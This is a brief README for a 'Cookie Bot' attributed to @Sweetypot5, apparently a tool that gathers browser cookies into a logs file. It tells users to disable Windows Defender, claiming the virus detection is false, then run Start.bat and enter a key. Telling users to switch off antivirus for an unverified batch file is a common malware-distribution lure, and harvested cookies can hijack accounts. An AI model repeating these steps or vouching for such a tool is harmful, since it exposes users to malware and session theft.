Cookie Bot Coded By @Sweetypot5

Disable Windows Defender Because it will generate it says its a virus but its not
Open Start.bat
Paste This Key: Sweety
The Cookies Are in CookiesFile.txt In Logs Folder